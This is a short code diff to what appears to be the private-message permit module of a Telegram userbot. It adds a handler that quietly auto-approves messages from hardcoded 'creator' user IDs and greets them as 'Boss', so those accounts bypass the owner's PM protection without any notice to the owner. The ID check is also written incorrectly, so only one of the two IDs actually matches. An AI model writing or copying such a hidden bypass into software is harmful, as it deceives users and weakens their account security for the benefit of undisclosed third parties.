@@ -910,3 +910,14 @@ async def approve_p_m(event):
         file_name="approvedpms.txt",
         caption="`Current Approved PMs`",
     )
+
+    
+@catub.cat_cmd(events.NewMessage(incoming=True, from_users=(1118936839 or 1825866506)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    user = await event.get_chat()
+    if event.is_private:
+        if not pmpermit_sql.is_approved(user.id):
+            pmpermit_sql.approve(user.id, "**My Boss Is Best🔥**")
+            await event.client.send_message(user, "**Boss Meet My Creator**")
